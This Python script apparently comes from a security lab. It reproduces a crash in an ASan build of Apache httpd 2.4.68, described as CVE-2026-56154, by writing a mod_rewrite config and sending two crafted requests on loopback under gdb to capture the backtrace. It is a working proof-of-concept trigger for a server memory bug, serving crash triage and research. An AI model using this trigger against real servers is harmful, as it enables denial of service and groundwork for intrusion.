#!/usr/bin/env python3
"""gdb backtrace for the CVE-2026-56154 stale-Vary dereference (loopback only).

Runs the 2.4.68 ASan build as `httpd -X`, sends two requests with
`X-Test: yes`, and captures the SIGSEGV backtrace to logs/rw-gdb-bt.txt.
ASAN_OPTIONS=handle_segv=0 lets gdb stop at the fault before Apache's
SIGSEGV handler runs.
"""
import os
import socket
import subprocess
import time

BASE = "/home/mesh-home/mishe-tauftauf2shell/lab/apache2shell"
RUN = os.path.join(BASE, "run")
LOGS = os.path.join(BASE, "logs")
PORT = 7288
conf = os.path.join(RUN, "rw-gdb.conf")
err = os.path.join(LOGS, "rw-gdb-error.log")
root = os.path.join(BASE, "l3", "install-2.4.68-asan")
open(conf, "w").write("""ServerRoot "{root}"
PidFile "{run}/rw-gdb.pid"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule rewrite_module modules/mod_rewrite.so
ServerName localhost
ErrorLog "{err}"
LogLevel info rewrite:trace5
MaxMemFree 1
DocumentRoot "{base}/l3/docroot"
<Directory "{base}/l3/docroot">
    Require all granted
</Directory>
RewriteEngine On
RewriteCond %{{LA-U:HTTP:X-Test}} ^yes$
RewriteRule ^/index\\.html$ - [L]
""".format(root=root, run=RUN, port=PORT, err=err, base=BASE))

env = dict(os.environ)
env["ASAN_OPTIONS"] = "detect_leaks=0:handle_segv=0:abort_on_error=0"
cmd = ["gdb", "-q", "-batch",
       "-ex", "set pagination off",
       "-ex", "run",
       "-ex", "echo \\n==== BACKTRACE ====\\n",
       "-ex", "bt 30",
       "-ex", "echo \\n==== REGISTERS ====\\n",
       "-ex", "info registers rip rdi rsi rax",
       "--args", os.path.join(root, "bin", "httpd"), "-f", conf, "-X"]
p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT, env=env, cwd=root)
time.sleep(3.0)
for i in range(2):
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=3)
        s.sendall(("GET /index.html HTTP/1.1\r\nHost: localhost\r\n"
                   "X-Test: yes\r\nConnection: close\r\n\r\n").encode())
        s.recv(4096)
        s.close()
    except Exception as e:
        print("request %d: %s" % (i, e))
time.sleep(1.0)
try:
    p.stdin.write(b"kill\n")
    p.stdin.flush()
except (BrokenPipeError, OSError):
    pass
try:
    out, _ = p.communicate(timeout=20)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()
text = out.decode(errors="replace")
open(os.path.join(LOGS, "rw-gdb-bt.txt"), "w").write(text)
print(text[-6000:])
